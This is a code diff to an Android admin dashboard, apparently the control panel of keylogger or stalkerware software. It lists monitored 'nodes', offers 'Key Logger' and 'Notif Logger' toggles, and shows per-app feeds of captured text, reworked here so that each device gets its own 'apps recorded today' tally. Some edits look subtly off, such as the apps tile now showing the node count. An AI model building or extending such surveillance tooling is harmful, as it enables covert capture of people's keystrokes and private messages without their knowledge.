@@ -34,9 +34,7 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var txtAppsToday: TextView
     private lateinit var txtActiveNodes: TextView
     private lateinit var txtLiveStatusPill: TextView
-    private lateinit var containerAppsToday: LinearLayout
     private lateinit var etDeviceSearch: EditText
-    private lateinit var hourBarChartView: HourBarChartView
 
     private val masterDeviceList = mutableListOf<DeviceModel>()
     private val filteredDeviceList = mutableListOf<DeviceModel>()
@@ -51,7 +49,8 @@ class AdminMainActivity : AppCompatActivity() {
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
         var logFeed: String = "Waiting for telemetry...",
-        var lastSeenTimestamp: Long = 0L
+        var lastSeenTimestamp: Long = 0L,
+        val appsTodayMap: MutableMap<String, Int> = mutableMapOf()
     )
 
     data class LogEntry(
@@ -74,9 +73,7 @@ class AdminMainActivity : AppCompatActivity() {
         txtAppsToday = findViewById<TextView>(R.id.txtAppsToday)
         txtActiveNodes = findViewById<TextView>(R.id.txtActiveNodes)
         txtLiveStatusPill = findViewById<TextView>(R.id.txtLiveStatusPill)
-        containerAppsToday = findViewById<LinearLayout>(R.id.containerAppsToday)
         etDeviceSearch = findViewById<EditText>(R.id.etDeviceSearch)
-        hourBarChartView = findViewById<HourBarChartView>(R.id.hourBarChartView)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
@@ -102,7 +99,6 @@ class AdminMainActivity : AppCompatActivity() {
         }
         recyclerView.adapter = adapter
 
-        // Search filtering
         etDeviceSearch.addTextChangedListener(object : TextWatcher {
             override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
             override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
@@ -145,20 +141,14 @@ class AdminMainActivity : AppCompatActivity() {
         devicesListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val allEntries = mutableListOf<LogEntry>()
-                val appsTodayMap = mutableMapOf<String, Int>()
-                val hourlyCounts = FloatArray(24) { 0f }
-
                 val now = System.currentTimeMillis()
-                val calendar = Calendar.getInstance()
-                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
-                val todayYear = calendar.get(Calendar.YEAR)
-
                 var maxLastSeen = 0L
 
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
-                    if (masterDeviceList.none { it.name == deviceName }) {
-                        val device = DeviceModel(deviceName)
+                    var device = masterDeviceList.find { it.name == deviceName }
+                    if (device == null) {
+                        device = DeviceModel(deviceName)
                         masterDeviceList.add(device)
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
@@ -179,50 +169,31 @@ class AdminMainActivity : AppCompatActivity() {
                                 if (timestampMillis > maxLastSeen) {
                                     maxLastSeen = timestampMillis
                                 }
-
-                                // Check if timestamp falls within today in local timezone
-                                calendar.timeInMillis = timestampMillis
-                                if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
-                                    appsTodayMap[prettyApp] = (appsTodayMap[prettyApp] ?: 0) + 1
-                                    val hour = calendar.get(Calendar.HOUR_OF_DAY)
-                                    if (hour in 0..23) {
-                                        hourlyCounts[hour]++
-                                    }
-                                }
                             }
                         }
                     }
                 }
 
-                // Update metrics
-                val connectedCount = masterDeviceList.size
-                txtConnectedDevices.text = connectedCount.toString()
+                txtConnectedDevices.text = masterDeviceList.size.toString()
                 txtActivityEvents.text = allEntries.size.toString()
-                txtAppsToday.text = appsTodayMap.size.toString()
+                txtAppsToday.text = masterDeviceList.size.toString() // Total Nodes
 
-                // Presence pill: Online only if actual activity recorded within last 2 minutes (120,000 ms)
                 val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
                 if (isOnline) {
                     txtLiveStatusPill.text = "● ONLINE"
                     txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
-                    txtLiveStatusPill.setBackgroundColor(Color.parseColor("#1B4721"))
+                    txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
                     txtActiveNodes.text = "ONLINE"
                     txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
                 } else {
                     txtLiveStatusPill.text = "● OFFLINE"
                     txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
-                    txtLiveStatusPill.setBackgroundColor(Color.parseColor("#3F1F1F"))
+                    txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
                     txtActiveNodes.text = "OFFLINE"
                     txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
                 }
 
                 filterDevices(etDeviceSearch.text?.toString() ?: "")
-
-                // Update Apps Recorded Today tile
-                updateAppsTodayUI(appsTodayMap)
-
-                // Update 24-hour activity chart
-                hourBarChartView.setData(hourlyCounts)
             }
 
             override fun onCancelled(error: DatabaseError) {}
@@ -236,75 +207,6 @@ class AdminMainActivity : AppCompatActivity() {
             is Number -> value.toLong()
             is String -> value.toLongOrNull()
             else -> null
-        }
-    }
-
-    private fun updateAppsTodayUI(appsMap: Map<String, Int>) {
-        containerAppsToday.removeAllViews()
-        val sortedApps = appsMap.entries.sortedByDescending { it.value }
-
-        if (sortedApps.isEmpty()) {
-            val emptyTv = TextView(this).apply {
-                text = "No app activity recorded today."
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
-                setTextColor(Color.parseColor("#94A3B8"))
-                setPadding(0, 4, 0, 4)
-            }
-            containerAppsToday.addView(emptyTv)
-            return
-        }
-
-        val maxCount = sortedApps.first().value.toFloat().coerceAtLeast(1f)
-
-        for ((appName, count) in sortedApps) {
-            val rowLayout = LinearLayout(this).apply {
-                orientation = LinearLayout.VERTICAL
-                setPadding(0, 6, 0, 6)
-            }
-
-            val headerRow = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-            }
-
-            val nameTv = TextView(this).apply {
-                text = appName
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
-                setTypeface(null, android.graphics.Typeface.BOLD)
-                setTextColor(Color.parseColor("#F1F5F9"))
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
-            }
-
-            val countTv = TextView(this).apply {
-                text = "$count records"
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
-                setTextColor(Color.parseColor("#38BDF8"))
-                typeface = android.graphics.Typeface.MONOSPACE
-            }
-
-            headerRow.addView(nameTv)
-            headerRow.addView(countTv)
-            rowLayout.addView(headerRow)
-
-            val barContainer = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 6).apply { topMargin = 4 }
-                setBackgroundColor(Color.parseColor("#1E293B"))
-            }
-
-            val percent = (count.toFloat() / maxCount).coerceIn(0.01f, 1f)
-            val fillView = View(this).apply {
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, percent)
-                setBackgroundColor(Color.parseColor("#38BDF8"))
-            }
-            val emptyView = View(this).apply {
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
-            }
-
-            barContainer.addView(fillView)
-            barContainer.addView(emptyView)
-            rowLayout.addView(barContainer)
-
-            containerAppsToday.addView(rowLayout)
         }
     }
 
@@ -366,7 +268,12 @@ class AdminMainActivity : AppCompatActivity() {
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
+                val deviceAppsToday = mutableMapOf<String, Int>()
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+
+                val calendar = Calendar.getInstance()
+                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
+                val todayYear = calendar.get(Calendar.YEAR)
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
@@ -381,15 +288,21 @@ class AdminMainActivity : AppCompatActivity() {
 
                         if (text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
+
+                            calendar.timeInMillis = timestampMillis
+                            if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
+                                deviceAppsToday[prettyApp] = (deviceAppsToday[prettyApp] ?: 0) + 1
+                            }
                         }
                     }
                 }
 
-                // Sort newest on top
+                // Sort newest on top and optimize for large data handling by capping to 200 entries
                 entries.sortByDescending { it.first }
+                val limitedEntries = entries.take(200)
 
                 val sb = StringBuilder()
-                for (item in entries) {
+                for (item in limitedEntries) {
                     val timeStr = timeFormat.format(Date(item.first))
                     sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                 }
@@ -397,6 +310,8 @@ class AdminMainActivity : AppCompatActivity() {
                 val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
                     masterDeviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
+                    masterDeviceList[index].appsTodayMap.clear()
+                    masterDeviceList[index].appsTodayMap.putAll(deviceAppsToday)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -418,6 +333,7 @@ class AdminMainActivity : AppCompatActivity() {
             val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
+            val containerDeviceAppsToday: LinearLayout = view.findViewById<LinearLayout>(R.id.containerDeviceAppsToday)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -428,7 +344,7 @@ class AdminMainActivity : AppCompatActivity() {
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
             holder.txtDeviceName.text = device.name
-            holder.txtDeviceSub.text = "Active Node // Live Feed"
+            holder.txtDeviceSub.text = "Active Node // Full Telemetry"
 
             if (device.keylogging) {
                 holder.btnKey.text = "Key Logger: ON"
@@ -445,6 +361,9 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "Notif Logger: OFF"
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
+
+            // Populate per-device Apps Recorded Today tile
+            populateDeviceAppsToday(holder.containerDeviceAppsToday, device.appsTodayMap)
 
             holder.scrollView.setOnTouchListener { v, event ->
                 when (event.action) {
@@ -465,6 +384,75 @@ class AdminMainActivity : AppCompatActivity() {
 
             holder.btnNotif.setOnClickListener {
                 onToggle(device, "notif", !device.notifications)
+            }
+        }
+
+        private fun populateDeviceAppsToday(container: LinearLayout, appsMap: Map<String, Int>) {
+            val context = container.context
+            container.removeAllViews()
+            val sortedApps = appsMap.entries.sortedByDescending { it.value }
+
+            if (sortedApps.isEmpty()) {
+                val emptyTv = TextView(context).apply {
+                    text = "No app activity recorded today."
+                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
+                    setTextColor(Color.parseColor("#94A3B8"))
+                }
+                container.addView(emptyTv)
+                return
+            }
+
+            val maxCount = sortedApps.first().value.toFloat().coerceAtLeast(1f)
+
+            for ((appName, count) in sortedApps) {
+                val rowLayout = LinearLayout(context).apply {
+                    orientation = LinearLayout.VERTICAL
+                    setPadding(0, 4, 0, 4)
+                }
+
+                val headerRow = LinearLayout(context).apply {
+                    orientation = LinearLayout.HORIZONTAL
+                }
+
+                val nameTv = TextView(context).apply {
+                    text = appName
+                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
+                    setTypeface(null, android.graphics.Typeface.BOLD)
+                    setTextColor(Color.parseColor("#F1F5F9"))
+                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
+                }
+
+                val countTv = TextView(context).apply {
+                    text = "$count records"
+                    setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 10f)
+                    setTextColor(Color.parseColor("#38BDF8"))
+                    typeface = android.graphics.Typeface.MONOSPACE
+                }
+
+                headerRow.addView(nameTv)
+                headerRow.addView(countTv)
+                rowLayout.addView(headerRow)
+
+                val barContainer = LinearLayout(context).apply {
+                    orientation = LinearLayout.HORIZONTAL
+                    layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 5).apply { topMargin = 2 }
+                    setBackgroundColor(Color.parseColor("#0A0F1D"))
+                }
+
+                val percent = (count.toFloat() / maxCount).coerceIn(0.01f, 1f)
+                val fillView = View(context).apply {
+                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, percent)
+                    setBackgroundColor(Color.parseColor("#38BDF8"))
+                }
+                val emptyView = View(context).apply {
+                    layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
+                }
+
+                barContainer.addView(fillView)
+                barContainer.addView(emptyView)
+                rowLayout.addView(barContainer)
+
+                container.addView(rowLayout)
             }
         }
 
